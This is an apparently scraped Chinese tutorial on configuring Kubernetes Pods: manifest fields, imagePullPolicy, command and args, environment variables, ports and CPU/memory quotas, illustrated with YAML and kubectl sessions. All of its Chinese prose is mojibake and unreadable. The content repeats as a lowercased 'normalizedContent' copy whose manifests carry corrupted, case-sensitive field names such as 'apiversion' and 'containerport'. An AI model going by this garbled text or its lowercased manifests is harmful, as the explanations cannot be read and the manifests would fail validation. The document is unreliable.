- name: nginx-port\n      containerPort: 80\n      protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-ports.yaml\npod/pod-ports created\n\n# æ¥çpod\n# å¨ä¸é¢å¯ä»¥ææ¾çå°éç½®ä¿¡æ¯\n[root@k8s-master01 ~]# kubectl get pod pod-ports -n dev -o yaml\n......\nspec:\n  containers:\n  - image: nginx:1.17.1\n    imagePullPolicy: IfNotPresent\n    name: nginx\n    ports:\n    - containerPort: 80\n      name: nginx-port\n      protocol: TCP\n......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè®¿é®å®¹å¨ä¸­çç¨åºéè¦ä½¿ç¨çæ¯ podip:containerPort\n\n\n# èµæºéé¢\n\nå®¹å¨ä¸­çç¨åºè¦è¿è¡ï¼è¯å®æ¯è¦å ç¨ä¸å®èµæºçï¼æ¯å¦ cpu ååå­ç­ï¼å¦æä¸å¯¹æä¸ªå®¹å¨çèµæºåéå¶ï¼é£ä¹å®å°±å¯è½åæå¤§éèµæºï¼å¯¼è´å¶å®å®¹å¨æ æ³è¿è¡ãéå¯¹è¿ç§æåµï¼kubernetes æä¾äºå¯¹åå­å cpu çèµæºè¿è¡éé¢çæºå¶ï¼è¿ç§æºå¶ä¸»è¦éè¿ resources éé¡¹å®ç°ï¼ä»æä¸¤ä¸ªå­éé¡¹ï¼\n\n * limitsï¼ç¨äºéå¶è¿è¡æ¶å®¹å¨çæå¤§å ç¨èµæºï¼å½å®¹å¨å ç¨èµæºè¶è¿ limits æ¶ä¼è¢«ç»æ­¢ï¼å¹¶è¿è¡éå¯\n * requests ï¼ç¨äºè®¾ç½®å®¹å¨éè¦çæå°èµæºï¼å¦æç¯å¢èµæºä¸å¤ï¼å®¹å¨å°æ æ³å¯å¨\n\nå¯ä»¥éè¿ä¸é¢ä¸¤ä¸ªéé¡¹è®¾ç½®èµæºçä¸ä¸éãå½éç½®äºåï¼ä¼èªå¨å»æ¾åéçä¸»æºèµæºæ¥å¯å¨ Pod\n\næ¥ä¸æ¥ï¼ç¼åä¸ä¸ªæµè¯æ¡ä¾ï¼åå»º pod-resources.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-resources\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    resources: # èµæºéé¢\n      limits:  # éå¶èµæºï¼ä¸éï¼\n        cpu: "2" # CPUéå¶ï¼åä½æ¯coreæ°\n        memory: "10Gi" # åå­éå¶\n      requests: # è¯·æ±èµæºï¼ä¸éï¼\n        cpu: "1"  # CPUéå¶ï¼åä½æ¯coreæ°\n        memory: "10Mi"  # åå­éå¶\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¨è¿å¯¹ cpu å memory çåä½åä¸ä¸ªè¯´æï¼\n\n * cpuï¼core æ°ï¼å¯ä»¥ä¸ºæ´æ°æå°æ°\n * memoryï¼ åå­å¤§å°ï¼å¯ä»¥ä½¿ç¨ GiãMiãGãM ç­å½¢å¼\n\n# è¿è¡Pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# æ¥çåç°podè¿è¡æ­£å¸¸\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev\nNAME            READY   STATUS    RESTARTS   AGE  \npod-resources   1/1     Running   0          39s   \n\n# æ¥ä¸æ¥ï¼åæ­¢Pod\n[root@k8s-master01 ~]# kubectl delete  -f pod-resources.yaml\npod "pod-resources" deleted\n\n# ç¼è¾podï¼ä¿®æ¹resources.requests.memoryçå¼ä¸º10Gi\n[root@k8s-master01 ~]# vim pod-resources.yaml\n\n# åæ¬¡å¯å¨pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# æ¥çPodç¶æï¼åç°Podå¯å¨å¤±è´¥\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev -o wide\nNAME            READY   STATUS    RESTARTS   AGE          \npod-resources   0/1     Pending   0          20s    \n\n# æ¥çpodè¯¦æä¼åç°ï¼å¦ä¸æç¤º\n[root@k8s-master01 ~]# kubectl describe pod pod-resources -n dev\n......\nWarning  FailedScheduling  35s   default-scheduler  0/3 nodes are available: 1 node(s) had taint {node-role.kubernetes.io/master: }, that the pod didn\'t tolerate, 2 Insufficient memory.(åå­ä¸è¶³)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n',normalizedContent:'# ä»ç»\n\n\n# pod ç»æ\n\n\n\næ¯ä¸ª pod ä¸­é½å¯ä»¥åå«ä¸ä¸ªæèå¤ä¸ªå®¹å¨ï¼è¿äºå®¹å¨å¯ä»¥åä¸ºä¸¤ç±»ï¼\n\n * ç¨æ·ç¨åºæå¨çå®¹å¨ï¼æ°éå¯å¤å¯å°\n * pause å®¹å¨ï¼è¿æ¯æ¯ä¸ª pod é½ä¼æçä¸ä¸ªæ ¹å®¹å¨ï¼å®çä½ç¨æä¸¤ä¸ªï¼\n   * å¯ä»¥ä»¥å®ä¸ºä¾æ®ï¼è¯ä¼°æ´ä¸ª pod çå¥åº·ç¶æ\n   * å¯ä»¥å¨æ ¹å®¹å¨ä¸è®¾ç½® ip å°åï¼å¶å®å®¹å¨é½æ­¤ ipï¼pod ipï¼ï¼ä»¥å®ç° pod åé¨çç½è·¯éä¿¡\n     è¿éæ¯podåé¨çéè®¯ï¼podçä¹é´çéè®¯éç¨èæäºå±ç½ç»ææ¯æ¥å®ç°ï¼æä»¬å½åç¯å¢ç¨çæ¯flannel\n\n\n# pod å®ä¹\n\nä¸é¢æ¯ pod çèµæºæ¸åï¼\n\napiversion: v1     #å¿éï¼çæ¬å·ï¼ä¾å¦v1\nkind: pod       ã #å¿éï¼èµæºç±»åï¼ä¾å¦ pod\nmetadata:       ã #å¿éï¼åæ°æ®\n  name: string     #å¿éï¼podåç§°\n  namespace: string  #podæå±çå½åç©ºé´,é»è®¤ä¸º"default"\n  labels:       ãã  #èªå®ä¹æ ç­¾åè¡¨\n    - name: string      ã          \nspec:  #å¿éï¼podä¸­å®¹å¨çè¯¦ç»å®ä¹\n  containers:  #å¿éï¼podä¸­å®¹å¨åè¡¨\n  - name: string   #å¿éï¼å®¹å¨åç§°\n    image: string  #å¿éï¼å®¹å¨çéååç§°\n    imagepullpolicy: [ always|never|ifnotpresent ]  #è·åéåçç­ç¥ \n    command: [string]   #å®¹å¨çå¯å¨å½ä»¤åè¡¨ï¼å¦ä¸æå®ï¼ä½¿ç¨æåæ¶ä½¿ç¨çå¯å¨å½ä»¤\n    args: [string]      #å®¹å¨çå¯å¨å½ä»¤åæ°åè¡¨\n    workingdir: string  #å®¹å¨çå·¥ä½ç®å½\n    volumemounts:       #æè½½å°å®¹å¨åé¨çå­å¨å·éç½®\n    - name: string      #å¼ç¨podå®ä¹çå±äº«å­å¨å·çåç§°ï¼éç¨volumes[]é¨åå®ä¹ççå·å\n      mountpath: string #å­å¨å·å¨å®¹å¨åmountçç»å¯¹è·¯å¾ï¼åºå°äº512å­ç¬¦\n      readonly: boolean #æ¯å¦ä¸ºåªè¯»æ¨¡å¼\n    ports: #éè¦æ´é²çç«¯å£åºå·åè¡¨\n    - name: string        #ç«¯å£çåç§°\n      containerport: int  #å®¹å¨éè¦çå¬çç«¯å£å·\n      hostport: int       #å®¹å¨æå¨ä¸»æºéè¦çå¬çç«¯å£å·ï¼é»è®¤ä¸containerç¸å\n      protocol: string    #ç«¯å£åè®®ï¼æ¯ætcpåudpï¼é»è®¤tcp\n    env:   #å®¹å¨è¿è¡åéè®¾ç½®çç¯å¢åéåè¡¨\n    - name: string  #ç¯å¢åéåç§°\n      value: string #ç¯å¢åéçå¼\n    resources: #èµæºéå¶åè¯·æ±çè®¾ç½®\n      limits:  #èµæºéå¶çè®¾ç½®\n        cpu: string     #cpuçéå¶ï¼åä½ä¸ºcoreæ°ï¼å°ç¨äºdocker run --cpu-sharesåæ°\n        memory: string  #åå­éå¶ï¼åä½å¯ä»¥ä¸ºmib/gibï¼å°ç¨äºdocker run --memoryåæ°\n      requests: #èµæºè¯·æ±çè®¾ç½®\n        cpu: string    #cpuè¯·æ±ï¼å®¹å¨å¯å¨çåå§å¯ç¨æ°é\n        memory: string #åå­è¯·æ±,å®¹å¨å¯å¨çåå§å¯ç¨æ°é\n    lifecycle: #çå½å¨æé©å­\n        poststart: #å®¹å¨å¯å¨åç«å³æ§è¡æ­¤é©å­,å¦ææ§è¡å¤±è´¥,ä¼æ ¹æ®éå¯ç­ç¥è¿è¡éå¯\n        prestop: #å®¹å¨ç»æ­¢åæ§è¡æ­¤é©å­,æ è®ºç»æå¦ä½,å®¹å¨é½ä¼ç»æ­¢\n    livenessprobe:  #å¯¹podååå®¹å¨å¥åº·æ£æ¥çè®¾ç½®ï¼å½æ¢æµæ ååºå æ¬¡åå°èªå¨éå¯è¯¥å®¹å¨\n      exec:       ã #å¯¹podå®¹å¨åæ£æ¥æ¹å¼è®¾ç½®ä¸ºexecæ¹å¼\n        command: [string]  #execæ¹å¼éè¦å¶å®çå½ä»¤æèæ¬\n      httpget:       #å¯¹podåä¸ªå®¹å¨å¥åº·æ£æ¥æ¹æ³è®¾ç½®ä¸ºhttpgetï¼éè¦å¶å®pathãport\n        path: string\n        port: number\n        host: string\n        scheme: string\n        httpheaders:\n        - name: string\n          value: string\n      tcpsocket:     #å¯¹podåä¸ªå®¹å¨å¥åº·æ£æ¥æ¹å¼è®¾ç½®ä¸ºtcpsocketæ¹å¼\n         port: number\n       initialdelayseconds: 0       #å®¹å¨å¯å¨å®æåé¦æ¬¡æ¢æµçæ¶é´ï¼åä½ä¸ºç§\n       timeoutseconds: 0    ãã    #å¯¹å®¹å¨å¥åº·æ£æ¥æ¢æµç­å¾ååºçè¶æ¶æ¶é´ï¼åä½ç§ï¼é»è®¤1ç§\n       periodseconds: 0     ãã    #å¯¹å®¹å¨çæ§æ£æ¥çå®ææ¢æµæ¶é´è®¾ç½®ï¼åä½ç§ï¼é»è®¤10ç§ä¸æ¬¡\n       successthreshold: 0\n       failurethreshold: 0\n       securitycontext:\n         privileged: false\n  restartpolicy: [always | never | onfailure]  #podçéå¯ç­ç¥\n  nodename: <string> #è®¾ç½®nodenameè¡¨ç¤ºå°è¯¥podè°åº¦å°æå®å°åç§°çnodeèç¹ä¸\n  nodeselector: obeject #è®¾ç½®nodeselectorè¡¨ç¤ºå°è¯¥podè°åº¦å°åå«è¿ä¸ªlabelçnodeä¸\n  imagepullsecrets: #pulléåæ¶ä½¿ç¨çsecretåç§°ï¼ä»¥keyï¼secretkeyæ ¼å¼æå®\n  - name: string\n  hostnetwork: false   #æ¯å¦ä½¿ç¨ä¸»æºç½ç»æ¨¡å¼ï¼é»è®¤ä¸ºfalseï¼å¦æè®¾ç½®ä¸ºtrueï¼è¡¨ç¤ºä½¿ç¨å®¿ä¸»æºç½ç»\n  volumes:   #å¨è¯¥podä¸å®ä¹å±äº«å­å¨å·åè¡¨\n  - name: string    #å±äº«å­å¨å·åç§° ï¼volumesç±»åæå¾å¤ç§ï¼\n    emptydir: {}       #ç±»åä¸ºemtydirçå­å¨å·ï¼ä¸podåçå½å¨æçä¸ä¸ªä¸´æ¶ç®å½ãä¸ºç©ºå¼\n    hostpath: string   #ç±»åä¸ºhostpathçå­å¨å·ï¼è¡¨ç¤ºæè½½podæå¨å®¿ä¸»æºçç®å½\n      path: string      ãã        #podæå¨å®¿ä¸»æºçç®å½ï¼å°è¢«ç¨äºåæä¸­mountçç®å½\n    secret:       ããã#ç±»åä¸ºsecretçå­å¨å·ï¼æè½½éç¾¤ä¸å®ä¹çsecretå¯¹è±¡å°å®¹å¨åé¨\n      scretname: string  \n      items:     \n      - key: string\n        path: string\n    configmap:         #ç±»åä¸ºconfigmapçå­å¨å·ï¼æè½½é¢å®ä¹çconfigmapå¯¹è±¡å°å®¹å¨åé¨\n      name: string\n      items:\n      - key: string\n        path: string\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n\n\nä¸ç¥éç¸å³ç type æä»ä¹èµæºç±»åå¯åï¼å¯ä»¥éè¿ä¸ä¸ªå½ä»¤æ¥æ¥çæ¯ç§èµæºçå¯éç½®é¡¹\n\n#   kubectl explain èµæºç±»å         æ¥çæç§èµæºå¯ä»¥éç½®çä¸çº§å±æ§\n#   kubectl explain èµæºç±»å.å±æ§     æ¥çå±æ§çå­å±æ§\n[root@k8s-master01 ~]# kubectl explain pod\nkind:     pod\nversion:  v1\nfields:\n   apiversion   <string>\n   kind <string>\n   metadata     <object>\n   spec <object>\n   status       <object>\n\n[root@k8s-master01 ~]# kubectl explain pod.metadata\nkind:     pod\nversion:  v1\nresource: metadata <object>\nfields:\n   annotations  <map[string]string>\n   clustername  <string>\n   creationtimestamp    <string>\n   deletiongraceperiodseconds   <integer>\n   deletiontimestamp    <string>\n   finalizers   <[]string>\n   generatename <string>\n   generation   <integer>\n   labels       <map[string]string>\n   managedfields        <[]object>\n   name <string>\n   namespace    <string>\n   ownerreferences      <[]object>\n   resourceversion      <string>\n   selflink     <string>\n   uid  <string>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\nå¨ kubernetes ä¸­åºæ¬ææèµæºçä¸çº§å±æ§é½æ¯ä¸æ ·çï¼ä¸»è¦åå« 5 é¨åï¼\n\n * apiversion çæ¬ï¼ç± kubernetes åé¨å®ä¹ï¼çæ¬å·å¿é¡»å¯ä»¥ç¨ kubectl api-versions æ¥è¯¢å°\n * kind ç±»åï¼ç± kubernetes åé¨å®ä¹ï¼çæ¬å·å¿é¡»å¯ä»¥ç¨ kubectl api-resources æ¥è¯¢å°\n * metadata åæ°æ®ï¼ä¸»è¦æ¯èµæºæ è¯åè¯´æï¼å¸¸ç¨çæ nameãnamespaceãlabels ç­\n * spec æè¿°ï¼è¿æ¯éç½®ä¸­æéè¦çä¸é¨åï¼éé¢æ¯å¯¹åç§èµæºéç½®çè¯¦ç»æè¿°\n * status ç¶æä¿¡æ¯ï¼éé¢çåå®¹ä¸éè¦å®ä¹ï¼ç± kubernetes èªå¨çæ\n\nå¨ä¸é¢çå±æ§ä¸­ï¼spec æ¯æ¥ä¸æ¥ç ç©¶çéç¹ï¼ç»§ç»­çä¸å®çå¸¸è§å­å±æ§:\n\n * containers <[] object> å®¹å¨åè¡¨ï¼ç¨äºå®ä¹å®¹å¨çè¯¦ç»ä¿¡æ¯\n * nodename æ ¹æ® nodename çå¼å° pod è°åº¦å°æå®ç node èç¹ä¸\n * nodeselector <map []> æ ¹æ® nodeselector ä¸­å®ä¹çä¿¡æ¯éæ©å°è¯¥ pod è°åº¦å°åå«è¿äº label ç node ä¸\n * hostnetwork æ¯å¦ä½¿ç¨ä¸»æºç½ç»æ¨¡å¼ï¼é»è®¤ä¸º falseï¼å¦æè®¾ç½®ä¸º trueï¼è¡¨ç¤ºä½¿ç¨å®¿ä¸»æºç½ç»\n * volumes <[] object> å­å¨å·ï¼ç¨äºå®ä¹ pod ä¸é¢æå¨çå­å¨ä¿¡æ¯\n * restartpolicy éå¯ç­ç¥ï¼è¡¨ç¤º pod å¨éå°æéçæ¶åçå¤çç­ç¥\n\n\n# pod éç½®\n\nä¸»è¦æ¥ç ç©¶ pod.spec.containers å±æ§ï¼è¿ä¹æ¯ pod éç½®ä¸­æä¸ºå³é®çä¸é¡¹éç½®ã\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers\nkind:     pod\nversion:  v1\nresource: containers <[]object>   # æ°ç»ï¼ä»£è¡¨å¯ä»¥æå¤ä¸ªå®¹å¨\nfields:\n   name  <string>     # å®¹å¨åç§°\n   image <string>     # å®¹å¨éè¦çéåå°å\n   imagepullpolicy  <string> # éåæåç­ç¥ \n   command  <[]string> # å®¹å¨çå¯å¨å½ä»¤åè¡¨ï¼å¦ä¸æå®ï¼ä½¿ç¨æåæ¶ä½¿ç¨çå¯å¨å½ä»¤\n   args     <[]string> # å®¹å¨çå¯å¨å½ä»¤éè¦çåæ°åè¡¨\n   env      <[]object> # å®¹å¨ç¯å¢åéçéç½®\n   ports    <[]object>     # å®¹å¨éè¦æ´é²çç«¯å£å·åè¡¨\n   resources <object>      # èµæºéå¶åèµæºè¯·æ±çè®¾ç½®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# åºæ¬éç½®\n\nåå»º pod-base.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-base\n  namespace: dev\n  labels:\n    user: heima\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nä¸é¢å®ä¹äºä¸ä¸ªæ¯è¾ç®å pod çéç½®ï¼éé¢æä¸¤ä¸ªå®¹å¨ï¼\n\n * nginxï¼ç¨ 1.17.1 çæ¬ç nginx éååå»ºï¼ï¼nginx æ¯ä¸ä¸ªè½»éçº§ web å®¹å¨ï¼\n * busyboxï¼ç¨ 1.30 çæ¬ç busybox éååå»ºï¼ï¼busybox æ¯ä¸ä¸ªå°å·§ç linux å½ä»¤éåï¼\n\n# åå»ºpod\n[root@k8s-master01 pod]# kubectl apply -f pod-base.yaml\npod/pod-base created\n\n# æ¥çpodç¶åµ\n# ready 1/2 : è¡¨ç¤ºå½åpodä¸­æ2ä¸ªå®¹å¨ï¼å¶ä¸­1ä¸ªåå¤å°±ç»ªï¼1ä¸ªæªå°±ç»ª\n# restarts  : éå¯æ¬¡æ°ï¼å ä¸ºæ1ä¸ªå®¹å¨æéäºï¼podä¸ç´å¨éå¯è¯å¾æ¢å¤å®\n[root@k8s-master01 pod]# kubectl get pod -n dev\nname       ready   status    restarts   age\npod-base   1/2     running   4          95s\n\n# å¯ä»¥éè¿describeæ¥çåé¨çè¯¦æ\n# æ­¤æ¶å·²ç»è¿è¡èµ·æ¥äºä¸ä¸ªåºæ¬çpodï¼æä»¥å®ææ¶æé®é¢\n[root@k8s-master01 pod]# kubectl describe pod pod-base -n dev\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# éåæå\n\nå½æä»¬ç pod å·²ç»æåéåå¹¶å¯å¨å®¹å¨ï¼å¶ä» pod ä¹éè¦æ­¤éåï¼é£ä¹æ­¤æ¶å¶ä» pod æåç¸åéåæ¯ä»éåæºæåï¼è¿æ¯ç´æ¥ä½¿ç¨å·²ç»æåè¿çéåï¼è¿å°±ç± imagepullpolicy æ¥å³å®ã\n\nåå»º pod-imagepullpolicy.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-imagepullpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    imagepullpolicy: never # ç¨äºè®¾ç½®éåæåç­ç¥\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nimagepullpolicyï¼ç¨äºè®¾ç½®éåæåç­ç¥ï¼kubernetes æ¯æéç½®ä¸ç§æåç­ç¥ï¼\n\n * alwaysï¼æ»æ¯ä»è¿ç¨ä»åºæåéåï¼ä¸ç´è¿ç¨ä¸è½½ï¼\n * ifnotpresentï¼æ¬å°æåä½¿ç¨æ¬å°éåï¼æ¬å°æ²¡æåä»è¿ç¨ä»åºæåéåï¼æ¬å°æå°±æ¬å° æ¬å°æ²¡è¿ç¨ä¸è½½ï¼\n * neverï¼åªä½¿ç¨æ¬å°éåï¼ä»ä¸å»è¿ç¨ä»åºæåï¼æ¬å°æ²¡æå°±æ¥é ï¼ä¸ç´ä½¿ç¨æ¬å°ï¼\n\n> é»è®¤å¼è¯´æ:\n> å¦æéå tag ä¸ºå·ä½çæ¬å·ï¼ é»è®¤ç­ç¥æ¯ï¼ifnotpresent\n> å¦æéå tag ä¸ºï¼latestï¼æç»çæ¬ï¼ ï¼é»è®¤ç­ç¥æ¯ always\n\n# åå»ºpod\n[root@k8s-master01 pod]# kubectl create -f pod-imagepullpolicy.yaml\npod/pod-imagepullpolicy created\n\n# æ¥çpodè¯¦æ\n# æ­¤æ¶ææ¾å¯ä»¥çå°nginxéåæä¸æ­¥pulling image "nginx:1.17.1"çè¿ç¨\n[root@k8s-master01 pod]# kubectl describe pod pod-imagepullpolicy -n dev\n......\nevents:\n  type     reason     age               from               message\n  ----     ------     ----              ----               -------\n  normal   scheduled  <unknown>         default-scheduler  successfully assigned dev/pod-imagepullpolicy to node1\n  normal   pulling    32s               kubelet, node1     pulling image "nginx:1.17.1"\n  normal   pulled     26s               kubelet, node1     successfully pulled image "nginx:1.17.1"\n  normal   created    26s               kubelet, node1     created container nginx\n  normal   started    25s               kubelet, node1     started container nginx\n  normal   pulled     7s (x3 over 25s)  kubelet, node1     container image "busybox:1.30" already present on machine\n  normal   created    7s (x3 over 25s)  kubelet, node1     created container busybox\n  normal   started    7s (x3 over 25s)  kubelet, node1     started container busybox\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# å¯å¨å½ä»¤\n\nå¨ åºæ¬éç½® çæ¡ä¾ä¸­ï¼æä¸ä¸ªé®é¢æ²¡æè§£å³ï¼å°±æ¯ busybox å®¹å¨ä¸ç´æ²¡ææåè¿è¡ï¼é£ä¹å°åºæ¯ä»ä¹åå å¯¼è´è¿ä¸ªå®¹å¨çæéå¢ï¼\n\nbusybox å¹¶ä¸æ¯ä¸ä¸ªç¨åºï¼èæ¯ç±»ä¼¼äºä¸ä¸ªå·¥å·ç±»çéåï¼kubernetes éç¾¤å¯å¨ç®¡çåï¼å®ä¼èªå¨å³é­ãè§£å³æ¹æ³å°±æ¯è®©å¶ä¸ç´å¨è¿è¡ï¼è¿å°±ç¨å°äº command éç½®ã\n\nåå»º pod-command.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-command\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n    # å®¹å¨å¯å¨æåï¼æ§è¡æ­»å¾ªç¯\n    command: ["/bin/sh","-c","touch /tmp/hello.txt;while true;do /bin/echo $(date +%t) >> /tmp/hello.txt; sleep 3; done;"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\ncommandï¼ç¨äºå¨ pod ä¸­çå®¹å¨åå§åå®æ¯ä¹åè¿è¡ä¸ä¸ªå½ä»¤ã\n\n> ç¨å¾®è§£éä¸ä¸é¢å½ä»¤çææï¼\n> "/bin/sh","-c", ä½¿ç¨ sh æ§è¡å½ä»¤\n> touch /tmp/hello.txt; åå»ºä¸ä¸ª /tmp/hello.txt æä»¶\n> while true;do /bin/echo $(date +% t) >> /tmp/hello.txt; sleep 3; done; æ¯é 3 ç§åæä»¶ä¸­åå¥å½åæ¶é´\n\n# åå»ºpod\n[root@k8s-master01 pod]# kubectl create  -f pod-command.yaml\npod/pod-command created\n\n# æ¥çpodç¶æ\n# æ­¤æ¶åç°ä¸¤ä¸ªpodé½æ­£å¸¸è¿è¡äº\n[root@k8s-master01 pod]# kubectl get pods pod-command -n dev\nname          ready   status   restarts   age\npod-command   2/2     runing   0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nè¿å¥ pod ä¸­ç busybox å®¹å¨ï¼æ¥çæä»¶åå®¹ï¼å½ä»¤å¦ä¸\n\nkubectl exec  podåç§° -n å½åç©ºé´ -it -c å®¹å¨åç§° /bin/sh\n\n\n1\n\n\nä½¿ç¨è¿ä¸ªå½ä»¤å°±å¯ä»¥è¿å¥æä¸ªå®¹å¨çåé¨ï¼ç¶åè¿è¡ç¸å³æä½äºï¼æ¯å¦ï¼å¯ä»¥æ¥ç txt æä»¶çåå®¹ãæ¼ç¤ºï¼\n\n[root@k8s-master01 pod]# kubectl exec pod-command -n dev -it -c busybox /bin/sh\n/ # tail -f /tmp/hello.txt\n14:44:19\n14:44:22\n14:44:25\n\n\n1\n2\n3\n4\n5\n\n\n> ç¹å«è¯´æï¼\n> éè¿ä¸é¢åç° command å·²ç»å¯ä»¥å®æå¯å¨å½ä»¤åä¼ éåæ°çåè½ï¼ä¸ºä»ä¹è¿éè¿è¦æä¾ä¸ä¸ª args éé¡¹ï¼ç¨äºä¼ éåæ°å¢ï¼è¿å¶å®è· docker æç¹å³ç³»ï¼kubernetes ä¸­ç commandãargs ä¸¤é¡¹å¶å®æ¯å®ç°è¦ç dockerfile ä¸­ entrypoint çåè½ã\n> 1 å¦æ command å args åæ²¡æåï¼é£ä¹ç¨ dockerfile çéç½®ã\n> 2 å¦æ command åäºï¼ä½ args æ²¡æåï¼é£ä¹ dockerfile é»è®¤çéç½®ä¼è¢«å¿½ç¥ï¼æ§è¡è¾å¥ç command\n> 3 å¦æ command æ²¡åï¼ä½ args åäºï¼é£ä¹ dockerfile ä¸­éç½®ç entrypoint çå½ä»¤ä¼è¢«æ§è¡ï¼ä½¿ç¨å½å args çåæ°\n> 4 å¦æ command å args é½åäºï¼é£ä¹ dockerfile çéç½®è¢«å¿½ç¥ï¼æ§è¡ command å¹¶è¿½å ä¸ args åæ°\n\n\n# ç¯å¢åé\n\nåå»º pod-env.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-env\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do /bin/echo $(date +%t);sleep 60; done;"]\n    env: # è®¾ç½®ç¯å¢åéåè¡¨\n    - name: "username"\n      value: "admin"\n    - name: "password"\n      value: "123456"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nenvï¼ç¯å¢åéï¼ç¨äºå¨ pod ä¸­çå®¹å¨è®¾ç½®ç¯å¢åéã\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-env.yaml\npod/pod-env created\n\n# è¿å¥å®¹å¨ï¼è¾åºç¯å¢åé\n[root@k8s-master01 ~]# kubectl exec pod-env -n dev -c busybox -it /bin/sh\n/ # echo $username\nadmin\n/ # echo $password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nè¿ç§æ¹å¼ä¸æ¯å¾æ¨èï¼æ¨èå°è¿äºéç½®åç¬å­å¨å¨éç½®æä»¶ä¸­ï¼è¿ç§æ¹å¼å°å¨åé¢ä»ç»ã\n\n\n# ç«¯å£è®¾ç½®\n\næ¬å°èæ¥ä»ç»å®¹å¨çç«¯å£è®¾ç½®ï¼ä¹å°±æ¯ containers ç ports éé¡¹ã\n\né¦åçä¸ ports æ¯æçå­éé¡¹ï¼\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.ports\nkind:     pod\nversion:  v1\nresource: ports <[]object>\nfields:\n   name         <string>  # ç«¯å£åç§°ï¼å¦ææå®ï¼å¿é¡»ä¿è¯nameå¨podä¸­æ¯å¯ä¸ç\t\t\n   containerport<integer> # å®¹å¨è¦çå¬çç«¯å£(0<x<65536)\n   hostport     <integer> # å®¹å¨è¦å¨ä¸»æºä¸å¬å¼çç«¯å£ï¼å¦æè®¾ç½®ï¼ä¸»æºä¸åªè½è¿è¡å®¹å¨çä¸ä¸ªå¯æ¬(ä¸è¬çç¥) \n   hostip       <string>  # è¦å°å¤é¨ç«¯å£ç»å®å°çä¸»æºip(ä¸è¬çç¥)\n   protocol     <string>  # ç«¯å£åè®®ãå¿é¡»æ¯udpãtcpæsctpãé»è®¤ä¸ºâtcpâã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næ¥ä¸æ¥ï¼ç¼åä¸ä¸ªæµè¯æ¡ä¾ï¼åå»º pod-ports.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-ports\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: # è®¾ç½®å®¹å¨æ´é²çç«¯å£åè¡¨\n    - name: nginx-port\n      containerport: 80\n      protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-ports.yaml\npod/pod-ports created\n\n# æ¥çpod\n# å¨ä¸é¢å¯ä»¥ææ¾çå°éç½®ä¿¡æ¯\n[root@k8s-master01 ~]# kubectl get pod pod-ports -n dev -o yaml\n......\nspec:\n  containers:\n  - image: nginx:1.17.1\n    imagepullpolicy: ifnotpresent\n    name: nginx\n    ports:\n    - containerport: 80\n      name: nginx-port\n      protocol: 